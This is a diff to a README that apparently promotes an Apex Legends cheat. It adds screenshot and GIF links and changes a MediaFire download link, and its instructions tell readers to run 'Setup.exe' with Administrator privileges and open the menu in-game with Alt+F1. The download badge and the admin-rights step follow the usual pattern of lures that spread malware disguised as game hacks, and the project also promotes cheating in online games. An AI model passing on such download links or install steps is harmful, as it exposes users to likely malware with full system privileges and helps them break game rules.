@@ -22,8 +22,8 @@ Experience peak performance on the battlefield with our state-of-the-art Apex Le
 
 ## 📸 Screenshots
 
-screen             
-screen
+![apex rep](https://github.com/user-attachments/assets/c250ffd9-71cd-4622-a721-e81c0cb905ec)
+
 
 ## ✨ Features
 
@@ -38,7 +38,8 @@ screen
 
 ### 📽️ Live Demonstration GIF
 
-gif
+![apex (1)](https://github.com/user-attachments/assets/9a673725-c9ae-495c-8eb4-f82a1ed16e07)
+
 
 ---
 
@@ -60,7 +61,7 @@ gif
 4. Run `Setup.exe` with Administrator privileges  
 5. Launch Apex Legends and toggle menu with `Alt+F1`  
 
-[![⬇ DOWNLOAD NOW](https://img.shields.io/badge/Download-INSTANT-orange)](https://www.mediafire.com/file_premium/hdulpj01r5cg4dp/HGRelease.v.2.7.zip/file)
+[![⬇ DOWNLOAD NOW](https://img.shields.io/badge/Download-INSTANT-orange)](https://app.mediafire.com/l3e38ptqu5gue)
 
 ---
 
